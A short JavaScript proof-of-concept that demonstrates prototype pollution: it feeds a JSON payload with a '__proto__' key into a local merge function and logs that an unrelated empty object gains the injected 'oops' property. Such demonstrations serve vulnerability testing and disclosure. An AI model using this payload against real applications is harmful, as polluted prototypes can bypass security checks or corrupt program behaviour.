var merge = require('./merge-objects');

var malicious_payload = '{"__proto__":{"oops":"It works !"}}';
var a = {};
console.log("Before : " + a.oops);
merge({}, JSON.parse(malicious_payload));
console.log("After : " + a.oops);